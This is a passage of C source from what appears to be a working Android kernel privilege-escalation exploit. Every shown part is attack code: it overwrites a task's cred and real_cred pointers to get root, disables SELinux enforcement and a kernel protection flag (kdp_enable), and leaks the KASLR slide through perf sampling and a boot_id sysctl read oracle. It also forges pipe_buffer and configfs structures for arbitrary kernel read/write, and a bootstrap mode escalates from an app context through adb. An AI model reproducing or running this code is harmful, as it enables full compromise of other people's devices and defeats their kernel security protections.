        pr_info("cand %d/%d%s round %d: cred write target=0x%016zx\n",
                ci + 1, ncands, sfx, round, cbase + (uintptr_t)TASK_CRED_OFF);
        slab_drain();
        do_one_write(cbase + (uintptr_t)TASK_CRED_OFF, "W2: cred", 2);
        usleep(50000);
        if (!g_child_shm) continue;
        uint32_t prev = *(volatile uint32_t *)((char *)g_child_shm + 4);
        __sync_synchronize();
        *(volatile uint32_t *)g_child_shm = 'C';
        __sync_synchronize();
        int wait = 3000;
        while (*(volatile uint32_t *)((char *)g_child_shm + 4) == prev) {
          usleep(1000);
          if (--wait == 0) break;
        }
        if (wait == 0) {
          pr_info("child uid readback timeout\n");
          continue;
        }
        uint32_t child_uid = *(volatile uint32_t *)((char *)g_child_shm + 8);
        pr_info("child uid = %u\n", child_uid);
        if (child_uid != 0) continue;
        pr_success("child is root (cand %d%s)!\n", ci + 1, sfx);
        /* W2b: pin real_cred too */
        slab_drain();
        do_one_write(cbase + (uintptr_t)TASK_REAL_CRED_OFF, "W2b: real_cred", 2);
        /* late KDP (default order; skipped if NO_KDP_OFF or KDP_FIRST) */
        if (!getenv("NO_KDP_OFF") && !getenv("KDP_FIRST")) {
          slab_drain();
          do_one_write(data_addr(KDP_ENABLE), "W-KDP: kdp_enable=0", 1);
          TIMER("W-KDP done");
        }
        got_root = 1;
      } else {
        /* KDP_FIRST set: kdp-verify comm probe rounds instead of cred writes */
        pr_info("cand %d round %d: kdp-verify comm probe target=0x%016zx\n",
                ci + 1, round, cbase + (uintptr_t)TASK_COMM_OFF);
        slab_drain();
        do_one_write(cbase + (uintptr_t)TASK_COMM_OFF, "W2: comm probe", 2);
        char path[64];
        char cb[16] = {0};
        snprintf(path, sizeof(path), "/proc/%d/comm", child);
        int cfd = open(path, O_RDONLY);
        if (cfd >= 0) {
          read(cfd, cb, 16);
          close(cfd);
        }
        if (cb[0] == 0 && cb[1] == 2 && cb[4] == 0x80) {
          uint32_t b5 = (uint8_t)cb[5];
          pr_info("comm now: %02x %02x %02x %02x (sig-land=%d)\n",
                  0, 2, (uint8_t)cb[2], (uint8_t)cb[3], b5 == 0xff);
          if (b5 == 0xff) {
            pr_success("task page writable\n");
            continue;
          }
        } else {
          pr_info("comm now: %02x %02x %02x %02x (sig-land=%d)\n",
                  (uint8_t)cb[0], (uint8_t)cb[1], (uint8_t)cb[2],
                  (uint8_t)cb[3], 0);
        }
        /* probe didn't land: retry the KDP write, keep probing */
        slab_drain();
        do_one_write(data_addr(KDP_ENABLE), "W-KDP retry", 1);
      }
    }
  }

  if (g_child_shm) {
    *(volatile uint32_t *)g_child_shm = 'G';
    __sync_synchronize();
  }
  close(pipes.cmd_w); close(pipes.uid_r);

  if (!got_root)
    pr_error("failed after 10 rounds\n");

  sleep(2);
  TIMER("exploit complete");

  pr_info("waiting for su...\n");
  for (int i = 0; i < 60; i++) {
    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
      pr_success("su ready, fixing SELinux policy\n");
      fix_selinux_policy();
      system("su -c 'setenforce 1' > /dev/null 2>&1");
      pr_success("sepolicy fix done\n");
      break;
    }
    sleep(1);
  }

  return 0;
}

int install_embedded_wallpaper(void) { return 0; }

/* A17: rwforge trigger — one route round with a mode-3 (direct value) write.
 * parent == RWF_SELF_PAGE makes the written VALUE the struct page of this
 * round's own spray page (resolved in prepare_skb_payload via
 * pselect_value_page_base). Returns consumer_success > 0. */
int rw_page_ok(void) {
  return rw_page != 0;
}

int rw_trigger(uintptr_t parent, uintptr_t target) {
  pselect_child_node = 1;
  uintptr_t value = parent;
  if (parent == RWF_SELF_PAGE) {
    value = 0;
    pselect_value_page_base = 1;
  }
  set_pselect_write_mode(target, value, 3);
  slab_drain();
  uintptr_t base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!base)
    pr_error("rw trigger: page prepare failed\n");
  rw_page = base;
  page_base = base;
  atomic_store(&consumer_success, 0);
  run_main_route_threads();
  int ok = atomic_load(&consumer_success) > 0;
  clear_pselect_write();
  pselect_value_page_base = 0;
  return ok;
}

/* A17: configfs helpers — g_cfg_buf is the physmap address of the armed
 * configfs attr's configfs_buffer; the rwforge channel patches its fields,
 * then pread/pwrite on the attr fd reads/writes kernel memory. */
int cfg_write8(int fd, uintptr_t addr, uint64_t value) {
  unsigned char buf[16] = {0};
  put64(buf, 0, addr);              /* bin_buffer = addr */
  put32(buf, 8, 8);                 /* bin_buffer_size = 8 */
  if (!rwf_phys_write(g_cfg_buf + CFG_BIN_BUFFER_OFF, buf, 16))
    return 0;
  return pwrite(fd, &value, 8, 0) == 8;
}

int cfg_place(uintptr_t addr) {
  unsigned char buf[16] = {0};
  put64(buf, 0, addr);
  put32(buf, 8, 8);
  return rwf_phys_write(g_cfg_buf + CFG_BIN_BUFFER_OFF, buf, 16);
}

/* Same, with an explicit bin_buffer_size — needed for offset pwrites into a
 * whole target page (the disarm writes single qwords at increasing offsets
 * into the reclaimed pipe_buffer array page). */
static int cfg_place_sz(uintptr_t addr, uint32_t size) {
  unsigned char buf[16] = {0};
  put64(buf, 0, addr);
  put32(buf, 8, size);
  return rwf_phys_write(g_cfg_buf + CFG_BIN_BUFFER_OFF, buf, 16);
}

/* cfg-forge: a second armed fd whose fake configfs_buffer descriptor stays
 * PARKED on the rd pipe_buffer array (object 1 in the reclaimed page).
 * rwf_forge then writes each forged pipe_buffer with a plain offset pwrite —
 * no a0 merge write, no forge-slot consumption.  This removes the 32-slot
 * array wall: a0-path forges past slot 31 overflow the 0x500-byte array into
 * the neighbor slab object, so the queue's link writes never landed
 * (boot71-81: peek=00 on the queue writes, helper never ran).  With forging
 * parked, post-arm channel ops are unlimited (the ring FIFO wraps cleanly:
 * every op splices one slot and drains one slot). */
int cfg_forge_enabled(void) { return g_cfg_forge_fd >= 0; }

int cfg_forge_pb(const void *pb, size_t slot) {
  if (g_cfg_forge_fd < 0 || slot >= PIPE_BUFFER_SLOTS)
    return 0;
  return pwrite(g_cfg_forge_fd, pb, 0x28, slot * 0x28) == 0x28;
}

/* Arm a second ashmem fd with the payload fops and park its descriptor on
 * the rd array.  Costs 4 forge ops (2 arm writes + f_mode RMW) + 1 fdarr
 * read + 1 park write — must run right after the primary arm, while the a0
 * budget (<31) still has headroom.  Fallback on failure: the a0 path with
 * its 31-slot budget (pre-cfg-forge behavior). */
static void cfg_forge_arm(void) {
  uintptr_t arr = pipebuf_page_base + PIPE_OBJECT_SIZE;  /* object 1 = rd */
  int fdB = open_ashmem_device();
  int ok2 = 0;
  if (fdB >= 0 && g_fdarr && (uint64_t)fdB < g_max_fds) {
    uint64_t F2 = rwf_read64(g_fdarr + (uintptr_t)fdB * 8);
    if (is_direct_ptr(F2)) {
      g_cfg_buf2 = page_base + 0x1240;   /* second fake configfs_buffer */
      ok2 = rwf_write64(F2 + 0x10, fake_fops);
      if (ok2) ok2 = rwf_write64(F2 + 0x20, g_cfg_buf2);
      /* FMODE_CAN_WRITE RMW, same as the primary arm (DELTA-NOTES §1):
       * never clobber f_mode on a stalled read */
      uint32_t fm2 = 0;
      if (ok2 && rwf_phys_read(F2 + 0xc, &fm2, 4)) {
        fm2 |= 0x40000;
        ok2 = rwf_phys_write(F2 + 0xc, &fm2, 4);
      } else {
        ok2 = 0;
      }
    }
  }
  if (ok2) {
    unsigned char dbuf[16] = {0};
    put64(dbuf, 0, arr);
    put32(dbuf, 8, PIPE_BUFFER_SLOTS * 0x28);
    if (rwf_phys_write(g_cfg_buf2 + CFG_BIN_BUFFER_OFF, dbuf, 16))
      ok2 = 1;
    else
      ok2 = 0;
  }
  if (ok2) {
    g_cfg_forge_fd = fdB;
    pr_success("wq-umh: cfg-forge parked on rd array (fd=%d arr=%016zx)\n",
               fdB, arr);
  } else {
    pr_warning("wq-umh: cfg-forge arm failed — a0 budget fallback\n");
  }
}

/* Zero the ops field of every slot in the rd ring's pipe_buffer array via
 * the armed configfs attr (one cfg_place, then plain offset pwrites — no
 * forge slots consumed).  free_pipe_info skips ops==NULL slots, so g4's exit
 * teardown no longer puts the never-refcounted target pages of forged slots
 * (image pages from channel reads) — that anon_pipe_buf_release → __folio_put
 * of a reserved page was the BUG: Bad page state at exit, fatal on device
 * (panic_on_oops).  The few legit marker slots lose their release too — a
 * harmless one-page leak each.
 * Scope: ONLY the rd array (object 1, 0x500 bytes inside its kmalloc-cg-2k
 * object): the object is 0x800 bytes, and configfs_bin_write_iter runs the
 * hardened-usercopy heap check against it — the old whole-page placement
 * (0x1000) aborted with usercopy BUG once cfg-forge made the placement
 * actually land (boot82). */
static void rwf_disarm_forged_slots(int cfgfd) {
  if (cfgfd < 0 || !g_cfg_buf) {
    pr_warning("wq-umh: disarm skipped (no armed fd)\n");
    return;
  }
  uintptr_t rd_arr = pipebuf_page_base + PIPE_OBJECT_SIZE;
  if (!cfg_place_sz(rd_arr, PIPE_BUFFER_SLOTS * 0x28)) {
    pr_warning("wq-umh: disarm cfg_place failed\n");
    return;
  }
  unsigned char zeros[8] = {0};
  int n = 0;
  for (int off = 0x10; off + 8 <= PIPE_BUFFER_SLOTS * 0x28; off += 0x28)
    if (pwrite(cfgfd, zeros, 8, off) == 8)
      n++;
  pr_success("wq-umh: forged slots disarmed (%d ops zeroed)\n", n);
}

int cfg_read8(int fd, uintptr_t addr, uint64_t *out) {
  unsigned char buf[24] = {0};
  put64(buf, 0, 8);                 /* count = 8 */
  put64(buf, 16, addr);             /* page = addr */
  if (!rwf_phys_write(g_cfg_buf, buf, 24))
    return 0;
  return pread(fd, out, 8, 0) == 8;
}

static int run_write1_only(void);
extern int mini_adb_port;
extern int mini_adb_shell(const char *cmd);

/* G4_LIBENTRY: rename the CLI entry so the same sources link into the boot
 * app's JNI shared library (its wrapper calls g4_cli_main in a forked
 * child — process isolation for the exploit's exit() paths). */
#ifdef G4_LIBENTRY
#define MAIN_NAME g4_cli_main
#else
#define MAIN_NAME main
#endif
int MAIN_NAME(int argc, char **argv) {
    setbuf(stdout, NULL);
    handle_umh_mode(argc, argv);
    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0) {
      /* --bootstrap mode: runs from app context (any UID, with seccomp).
       * 1) Write 1 → SELinux off
       * 2) setprop to enable adb TCP on 5555 (SELinux off → property_service allows it)
       * 3) mini-adb connects to 127.0.0.1:5555, authenticates with pre-pushed key,
       *    runs full exploit via adb shell (no app seccomp → perf works) */
      log_startup_context();
      if (run_write1_only() != 0) return 1;

      /* Wait for adb TCP — read the actual port from system property */
      int adb_port = 5555;
      char port_buf[32] = {};
      read_first_line(gh("/adb_port"), port_buf, sizeof(port_buf));
      if (port_buf[0]) adb_port = atoi(port_buf);
      if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
      pr_info("Waiting for adb TCP on port %d...\n", adb_port);
      for (int i = 0; i < 30; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr = {
          .sin_family = AF_INET,
          .sin_port = htons(adb_port),
          .sin_addr.s_addr = htonl(0x7f000001)
        };
        int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
        if (sock >= 0) close(sock);
        if (c == 0) {
          pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
          goto tcp_ready;
        }
        usleep(1000000);
      }
      pr_error("adbd not on TCP %d after 30s\n", adb_port);
    tcp_ready:
      usleep(200000);
      mini_adb_port = adb_port;
      pr_info("Connecting via mini-adb on port %d...\n", adb_port);
      int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
      pr_info("mini-adb returned %d\n", adb_ret);
      return adb_ret;
    }
    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
        return run_write1_only();
    if (argc > 1 && strcmp(argv[1], "--rwforge") == 0)
        return run_rwforge();
    if (argc > 1 && strcmp(argv[1], "--bootid-read") == 0)
        return run_bootid_oracle(argc, argv);
    return run_exploit(argc, argv);
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/20\n", att);
    do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  __builtin_unreachable();
}

/* ------------------------------------------------------------------ */
/* A17 rwforge — marching-forger channel + route-root modes            */
/* ------------------------------------------------------------------ */

/* IP-sampling KASLR leak: sample kernel IPs while hammering
 * prctl(PR_SET_NAME), vote on the hottest kernel text pages, match the
 * hottest page's 2MB residue against known anchors. Returns slide or
 * (uint64_t)-1. */
uint64_t perf_find_slide(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf slide: open failed errno=%d\n", errno);
    return (uint64_t)-1;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf slide: mmap failed errno=%d\n", errno);
    close(fd);
    return (uint64_t)-1;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 200000; i++) syscall(__NR_prctl, PR_SET_NAME, "e", 0, 0, 0);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uint64_t pages[256];
  uint32_t votes[256];
  int npages = 0;
  while (pos < head && npages < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->size >= 0x10 && ev->type == PERF_RECORD_SAMPLE) {
      uint64_t ip = *(uint64_t *)((char *)ev + 8);
      if (ip >= 0xffffff8000000000ULL) {
        uint64_t page = ip & ~0xfffULL;
        int j = 0;
        while (j < npages) {
          if (pages[j] == page) { votes[j]++; break; }
          j++;
        }
        if (j == npages) {
          pages[npages] = page;
          votes[npages] = 1;
          npages++;
        }
      }
    }
    pos += ev->size;
  }
  munmap(buf, msz);
  close(fd);
  if (npages < 1) {
    pr_warning("perf slide: no kernel samples\n");
    return (uint64_t)-1;
  }
  /* hottest page */
  int hot = -1;
  for (int i = 0; i < npages; i++)
    if (hot < 0 || votes[i] > votes[hot]) hot = i;
  if (hot < 0) {
    pr_warning("perf slide: no kernel samples\n");
    return (uint64_t)-1;
  }
  /* report top-3 pages (zeroing votes copy as we go) */
  uint32_t votes_copy[256];
  memcpy(votes_copy, votes, sizeof(votes));
  for (int rank = 0; rank < 3; rank++) {
    int best = -1;
    for (int i = 0; i < npages; i++) {
      if (votes_copy[i] < 1) continue;
      if (best < 0 || votes_copy[i] > votes_copy[best]) best = i;
    }
    if (best < 0) break;
    pr_info("perf slide: page#%d=%016zx votes=%d residue=%llx\n", rank,
            (size_t)pages[best], votes_copy[best],
            (unsigned long long)(pages[best] & 0x1fffff));
    votes_copy[best] = 0;
  }
  uint64_t hottest = pages[hot];
  uint64_t residue = hottest & 0x1fffff;
  uint64_t anchor;
  switch (residue) {
    case 0xf5000: anchor = 0xf5000; break;   /* __arm64_sys_prctl page */
    case 0xbd000: anchor = 0xbd000; break;   /* strncpy_from_user page */
    case 0x21000: anchor = 0x210000; break;  /* LOST: reconstructed — anchor pair as computed by e */
    case 0x22000: anchor = 0x220000; break;  /* LOST: reconstructed */
    default:
      pr_warning("perf slide: page residue %llx matches no anchor\n",
                 (unsigned long long)residue);
      return (uint64_t)-1;
  }
  uint64_t slide = hottest - (KIMAGE_TEXT_BASE + anchor);
  if (slide & 0xffffffc0001fffffULL)
    return (uint64_t)-1;
  pr_info("perf slide: page=%016zx votes=%d slide=%016llx\n",
          (size_t)hottest, votes[hot], (unsigned long long)slide);
  return slide;
}

/* Sample register values while hammering ioctl(fd, 0xff, 0); keep physmap
 * pointers (v >> 36 == 0xffffff8) whose IP lands in [lo, hi) (the target
 * handler's text window); dedup-vote into vals[]/votes[] (≤64). */
static int perf_sample_ioctl_votes(int fd, uint64_t *vals, uint32_t *votes,
                                   int *out_n, uintptr_t lo, uintptr_t hi) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = 0x7fffffff;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (pfd < 0) return -1;
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
  if (buf == MAP_FAILED) { close(pfd); return -1; }
  ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 60000; i++) ioctl(fd, 0xff, 0);
  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  *out_n = 0;
  int n = 0;
  while (pos < head) {
    if (n > 0x3f) break;
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + 8;
      if (lo != 0) {
        uint64_t ip = *(uint64_t *)p;
        if (ip < lo || ip >= hi) goto next;
      }
      int slots = (int)(ev->size / 8);
      if (slots < 2) slots = 2;
      slots -= 2;
      for (int i = 1; i != slots && i != 34; i++) {
        uint64_t v = ((uint64_t *)p)[i];
        if ((v >> 36) != 0x0ffffff8ULL) continue;
        int j = 0;
        while (j < n) {
          if (vals[j] == v) { votes[j]++; goto voted; }
          j++;
        }
        votes[n] = 1;
        vals[n] = v;
        n++;
        *out_n = n;
      voted:;
      }
    }
  next:
    pos += ev->size;
  }
  munmap(buf, msz);
  close(pfd);
  return 0;
}

/* Two-run ioctl voting: candidates hot on fd A but not on fd B (the two
 * ashmem fds differ only in which file struct the route armed) are the
 * leaked struct file pointers. keep[] sorted by votes desc, top 8 →
 * perf_file_cands[]. */
int perf_find_file(int fd_a, int fd_b, uint64_t slide) {
  static uint64_t va[64], vb[64];
  static uint32_t vota[64], votb[64];
  static struct { uint64_t v; uint32_t votes; uint32_t pad; } keep[8];
  int na = 0, nb = 0;
  uintptr_t lo = slide + KIMAGE_TEXT_BASE + ASHMEM_IOCTL_WIN_LO_OFF;
  uintptr_t hi = slide + KIMAGE_TEXT_BASE + ASHMEM_IOCTL_WIN_HI_OFF;
  perf_file_ncands = 0;
  if (perf_sample_ioctl_votes(fd_a, va, vota, &na, lo, hi) < 0) return -1;
  pr_info("filp-root: perf-file run A candidates=%d\n", na);
  if (perf_sample_ioctl_votes(fd_b, vb, votb, &nb, lo, hi) < 0) return -1;
  pr_info("filp-root: perf-file run B candidates=%d\n", nb);
  if (na <= 0) {
    perf_file_ncands = 0;
    return 0;
  }
  int nkeep = 0;
  for (int i = 0; i < na && nkeep < 8; i++) {
    if (vota[i] < 8) continue;
    if (nb >= 1) {
      for (int j = 0; j < nb; j++) {
        if (vb[j] == va[i]) {
          if (votb[j] > vota[i] / 10) goto skip;
          break;
        }
      }
    }
    keep[nkeep].v = va[i];
    keep[nkeep].votes = vota[i];
    nkeep++;
  skip:;
  }
  /* insertion sort by votes, descending */
  for (int i = 1; i < nkeep; i++) {
    uint64_t kv = keep[i].v;
    int kvotes = keep[i].votes;
    int j = i;
    while (j > 0 && keep[j - 1].votes < kvotes) {
      keep[j] = keep[j - 1];
      j--;
    }
    keep[j].v = kv;
    keep[j].votes = kvotes;
  }
  perf_file_ncands = nkeep;
  for (int i = 0; i < nkeep; i++) {
    perf_file_cands[i] = keep[i].v;
    pr_info("filp-root: file cand[%d]=%016zx votes=%d\n", i,
            keep[i].v, keep[i].votes);
  }
  return 0;
}

#define CAPTURE_CMD \
  "mkdir -p /data/local/tmp/cap && chmod 755 /data/local/tmp/cap; " \
  "cat /proc/last_kmsg > /data/local/tmp/cap/last_kmsg.txt 2>/dev/null; " \
  "dmesg > /data/local/tmp/cap/dmesg.txt 2>/dev/null; " \
  "cat /proc/iomem > /data/local/tmp/cap/iomem.txt 2>/dev/null; " \
  "cat /proc/cmdline > /data/local/tmp/cap/cmdline.txt 2>/dev/null; " \
  "cat /proc/kallsyms > /data/local/tmp/cap/kallsyms.txt 2>/dev/null; " \
  "id > /data/local/tmp/cap/id.txt; " \
  "ls -la /sys/fs/pstore/ > /data/local/tmp/cap/pstore_ls.txt 2>/dev/null; " \
  "for f in /sys/fs/pstore/*; do cp $f /data/local/tmp/cap/ 2>/dev/null; done; " \
  "chmod 644 /data/local/tmp/cap/* 2>/dev/null; " \
  "echo CAPTURES-DONE"

void __attribute__((noinline)) run_root_captures(void) {
  if (getenv("GL_NO_RWF_CAPTURE")) {
    pr_info("capture skipped (GL_NO_RWF_CAPTURE)\n");
    return;
  }
  int rc = system(CAPTURE_CMD);
  pr_info("capture rc=%d\n", rc);
}

static __attribute__((always_inline)) int hexval(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

/* Restore the retargeted sysctl boot_id data pointer, WITH verification:
 * after each restore rw_trigger, read boot_id back and compare against the
 * original UUID string captured before the retarget — a match means the
 * pointer again points at the real uuid storage. Retry the restore up to
 * 10 times. A missed restore leaves random_table.boot_id.data dangling at
 * the target window; if that window ever reads all-zero, the next boot_id
 * read by ANY process makes proc_do_uuid write a 16-byte UUID into kernel
 * memory — a deterministic panic class. Restore failure is fatal. */
static void bootid_oracle_restore_verified(uintptr_t sysctl,
                                           uintptr_t sysctl_orig,
                                           const char *orig) {
  for (int att = 1; att <= 10; att++) {
    rw_trigger(sysctl_orig, sysctl);
    char buf[64] = {0};
    int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
    if (fd >= 0) {
      ssize_t n = read(fd, buf, 63);
      close(fd);
      /* The mode-3 route's post-store (*cval = pc) clobbers bytes 0-7 of the
       * uuid buffer when the restore erase runs, so bytes 0-7 (uuid text
       * chars 0..18) can never match after a successful restore.  Compare
       * only chars 19+ (buffer bytes 8-15): a match means .data again points
       * at the real uuid storage. */
      if (n >= 36 && !strcmp(buf + 19, orig + 19)) {
        pr_info("bootid oracle: restore verified\n");
        return;
      }
    }
  }
  pr_error("bootid oracle: restore FAILED after 10 — dangling boot_id pointer, aborting\n");
}

/* boot_id read oracle: one constrained write retargets the sysctl boot_id
 * data pointer (proc_do_uuid) at addr-8; reading
 * /proc/sys/kernel/random/boot_id then formats 16 bytes [addr-8, addr+8).
 * The 8 bytes at addr come back in *out. Up to 10 trigger rounds.
 *
 * Per attempt: retarget → read (an unchanged read = retarget missed, retry)
 * → restore-with-verify. The restore runs whenever the retarget may have
 * landed (it rewrites the original value — harmless when the retarget
 * actually missed). */
int bootid_oracle_read8(uintptr_t addr, uint64_t *out) {
  uintptr_t sysctl = data_addr(SYSCTL_BOOTID_DATA_PTR);
  /* restore value = the uuid buffer's physmap alias, computed from the IMAGE
   * address so the KPHYS phys-base override is honored (the bare
   * SLIDE_SYSCTL_BOOTID const has delta=0 baked in; passing it through
   * data_addr() double-aliases it into garbage). */
  uintptr_t sysctl_orig = data_addr(SLIDE_SYSCTL_BOOTID_IMAGE);
  char orig[64] = {0};
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (fd < 0) return 0;
  ssize_t n = read(fd, orig, 63);
  close(fd);
  if (n < 1) return 0;
  addr -= 8;
  for (int att = 0; att < 10; att++) {
    int conn = rw_trigger(addr, sysctl);
    char buf[64] = {0};
    fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
    if (fd >= 0) {
      n = read(fd, buf, 63);
      close(fd);
    }
    int changed = (fd >= 0) && n >= 1 && strcmp(buf, orig) != 0;
    if (changed && getenv("RWF_DEBUG"))
      pr_info("oracle window text: %s", buf);
    if (conn || changed)
      bootid_oracle_restore_verified(sysctl, sysctl_orig, orig);
    if (!changed)
      continue;
    uint8_t val[16] = {0};
    if (!buf[0]) return 0;
    int nhex = 0;
    for (int i = 0; buf[i] && nhex < 32; i++) {
      int nib = hexval(buf[i]);
      if (nib < 0) continue;
      /* e builds each byte as nib | (old << 4): first char = high nibble */
      val[nhex / 2] = (uint8_t)(nib | (val[nhex / 2] << 4));
      nhex++;
    }
    if (nhex != 32) return 0;
    memcpy(out, val + 8, 8);
    return 1;
  }
  return 0;
}

void persist_u64(const char *path, uint64_t val) {
  char buf[24];
  int n = snprintf(buf, sizeof(buf), "%llu", (unsigned long long)val);
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd < 0) {
    pr_warning("persist %s failed errno=%d\n", path, errno);
    return;
  }
  write(fd, buf, n);
  fsync(fd);
  close(fd);
}

/* rq->curr own-task find via the boot_id oracle (no channel needed).
 * Chain: init_task.cred (KASLR anchor) → slide; __per_cpu_offset[CORE] →
 * delta; runqueues + slide + delta → rq; rq->curr @ +0xd10; self-check
 * pid == getpid(). */
/* Oracle slide derive: init_task.stack holds a true image pointer
 * (KIMAGE + slide + INIT_STACK_OFF); the kernel image is at a FIXED
 * physical load address on this device (P0_KERNEL_PHYS_LOAD=0x40000000,
 * delta=0 — effectively nokaslr for the direct map), so the restore-verified
 * boot_id oracle reads static kernel content via fixed direct-map aliases
 * with no slide needed. This replaces the perf IP-sampling leak in the
 * channel bring-up path (on-device the hottest sampled page's residue
 * 0x136000 matches no compiled-in anchor). */
static int64_t oracle_find_slide(void) {
  uint64_t stackv = 0;
  if (!bootid_oracle_read8(data_addr(INIT_TASK) + TASK_STACK_OFF, &stackv))
    return -1;
  int64_t slide = (int64_t)(stackv - (KIMAGE_TEXT_BASE + INIT_STACK_OFF));
  if (getenv("RWF_DEBUG"))
    pr_info("oracle slide: stackv=%016llx slide=%016llx\n",
            (unsigned long long)stackv, (unsigned long long)slide);
  if (stackv < KIMAGE_TEXT_BASE || stackv >= KIMAGE_TEXT_BASE + 0x40000000)
    return -1;
  if (slide < 0 || (slide & 0x1fffff) || slide >= 0x400000000LL)
    return -1;
  return slide;
}

/* Channel bring-up slide: oracle first (fixed-alias read, no perf), the
 * perf IP-sampling leak as fallback. */
static int64_t bringup_slide(void) {
  int64_t slide = oracle_find_slide();
  if (slide >= 0) {
    pr_info("fuse-bringup: oracle slide=%016llx\n", (unsigned long long)slide);
    return slide;
  }
  return (int64_t)perf_find_slide();
}

uintptr_t route_find_own_task(void) {
  uint64_t stackv = 0;
  int64_t slide = -1;
  int att = 0;
  for (att = 1; att <= 3; att++) {
    if (!bootid_oracle_read8(data_addr(INIT_TASK) + TASK_STACK_OFF, &stackv))
      continue;
    /* a valid anchor read: stackv = KIMAGE + slide + INIT_STACK_OFF */
    if (stackv < KIMAGE_TEXT_BASE || stackv >= KIMAGE_TEXT_BASE + 0x40000000) {
      pr_warning("route-root: slide read implausible v=%016llx\n",
                 (unsigned long long)stackv);
      continue;
    }
    slide = (int64_t)(stackv - (KIMAGE_TEXT_BASE + INIT_STACK_OFF));
    if (slide < 0 || (slide & 0x1fffff) || slide >= 0x400000000LL) {
      pr_warning("route-root: slide read implausible v=%016llx\n",
                 (unsigned long long)stackv);
      continue;
    }
    pr_info("route-root: slide=%016llx (attempt %d)\n",
            (unsigned long long)slide, att);
    goto slide_ok;
  }
  pr_error("route-root: slide derive failed\n");
slide_ok:;
  uint64_t pco = 0;
  uintptr_t pco_addr = data_addr(PER_CPU_OFFSETS) + (long)g_route_core * 8;
  if (!bootid_oracle_read8(pco_addr, &pco))
    pr_error("route-root: per_cpu_offset read failed\n");
  /* rq = runqueues image + slide + per_cpu_offset[core] */
  uintptr_t rq = KIMAGE_TEXT_BASE + (uint64_t)slide + RUNQUEUES_OFF + pco;
  pr_info("route-root: delta=%016llx rq=%016zx\n",
          (unsigned long long)pco, rq);
  if (!is_kernel_ptr(rq)) {
    pr_warning("route-root: bad rq ptr %016zx\n", rq);
    return 0;
  }
  uint64_t curr = 0;
  if (!bootid_oracle_read8(rq + RQ_CURR_OFF, &curr))
    pr_error("route-root: rq.curr read failed\n");
  pr_info("route-root: curr=%016zx\n", curr);
  if (!is_direct_ptr(curr)) {
    pr_warning("route-root: bad curr %016zx\n", curr);
    return 0;
  }
  if (!getenv("GL_ROUTE_ROOT_NO_PID")) {
    uint64_t pidv = 0;
    if (!bootid_oracle_read8(curr + TASK_PID_OFF, &pidv))
      pr_error("route-root: pid read failed\n");
    uint32_t pid = (uint32_t)pidv;
